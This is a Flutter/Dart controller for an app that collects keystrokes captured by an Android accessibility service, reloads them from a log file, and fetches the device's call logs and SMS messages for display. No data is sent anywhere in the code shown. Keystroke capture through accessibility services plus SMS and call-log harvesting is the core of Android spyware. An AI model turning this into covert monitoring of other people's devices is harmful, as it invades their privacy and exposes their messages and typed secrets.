import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; // for PlatformException
import 'package:get/get.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_phone_events/core/services/method_channel_service.dart';

// controller for the home screen — manages logs, call/SMS data, and accessibility status
class HomeController extends GetxController with WidgetsBindingObserver {
  final MethodChannelService _channelService = MethodChannelService();

  // reactive log list for keystrokes (newest first)
  var logs = <String>[].obs;

  // reactive lists for call logs and SMS messages from native layer
  var callLogs = <Map<String, dynamic>>[].obs;
  var smsLogs = <Map<String, dynamic>>[].obs;

  // whether the accessibility service is currently enabled
  var isAccessibilityEnabled = false.obs;

  // loading state for call/SMS data
  var isLoadingComm = false.obs;

  // permission state flags — true when the user denied READ_CALL_LOG or READ_SMS
  var callLogsPermissionDenied = false.obs;
  var smsLogsPermissionDenied = false.obs;

  // tracks last successful fetch to avoid redundant calls on every app resume
  DateTime? _lastCommFetch;

  @override
  void onInit() {
    super.onInit();
    WidgetsBinding.instance.addObserver(this);

    // wire up the method channel and set the keystroke callback
    _channelService.onKeyStrokeReceived = _onKeyStroke;
    _channelService.init();

    _loadLogsFromFile();
    checkAccessibilityStatus();
    // fetch call/SMS data on startup
    fetchCommData();
  }

  @override
  void onClose() {
    WidgetsBinding.instance.removeObserver(this);
    super.onClose();
  }

  // reload logs and data when app returns to foreground
  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _loadLogsFromFile();
      checkAccessibilityStatus();
      // Always refetch immediately if a permission was previously denied —
      // the user may have just granted it from the system dialog.
      // Otherwise apply the 30-second debounce to avoid redundant requests
      // (e.g. when returning from accessibility settings).
      final permissionWasDenied =
          callLogsPermissionDenied.value || smsLogsPermissionDenied.value;
      final now = DateTime.now();
      if (permissionWasDenied ||
          _lastCommFetch == null ||
          now.difference(_lastCommFetch!).inSeconds > 30) {
        fetchCommData();
      }
    }
  }

  // handle incoming keystroke from native layer
  void _onKeyStroke(String text) {
    final entry = '${DateTime.now()}: $text';
    debugPrint('Received from native: $entry');
    logs.insert(0, entry);
  }

  // query native layer for accessibility service status
  Future<void> checkAccessibilityStatus() async {
    isAccessibilityEnabled.value =
        await _channelService.isAccessibilityEnabled();
  }

  // open device accessibility settings via native layer
  Future<void> openAccessibilitySettings() async {
    await _channelService.openAccessibilitySettings();
  }

  // fetch call logs and SMS messages from native layer via method channel
  Future<void> fetchCommData() async {
    _lastCommFetch = DateTime.now();
    isLoadingComm.value = true;
    try {
      // --- Call logs ---
      try {
        final calls = await _channelService.getCallLogs();
        callLogs.assignAll(calls);
        callLogsPermissionDenied.value = false;
      } on PlatformException {
        // READ_CALL_LOG permission was denied by the user
        callLogsPermissionDenied.value = true;
        callLogs.clear();
      }

      // --- SMS logs ---
      try {
        final sms = await _channelService.getSmsLogs();
        smsLogs.assignAll(sms);
        smsLogsPermissionDenied.value = false;
      } on PlatformException {
        // READ_SMS permission was denied by the user
        smsLogsPermissionDenied.value = true;
        smsLogs.clear();
      }
    } catch (e) {
      debugPrint('Fetch comm data error: $e');
    } finally {
      isLoadingComm.value = false;
    }
  }

  // read keystroke log file from disk (written by MyAccessibilityService)
  Future<void> _loadLogsFromFile() async {
    try {
      // getApplicationSupportDirectory() maps to Android's context.filesDir —
      // the same directory where MyAccessibilityService writes keypress_logs.txt
      final dir = await getApplicationSupportDirectory();
      final file = File('${dir.path}/keypress_logs.txt');

      if (await file.exists()) {
        final lines = await file.readAsLines();
        logs.assignAll(lines.reversed.toList());
      }
    } catch (e) {
      debugPrint('File load error: $e');
    }
  }
}
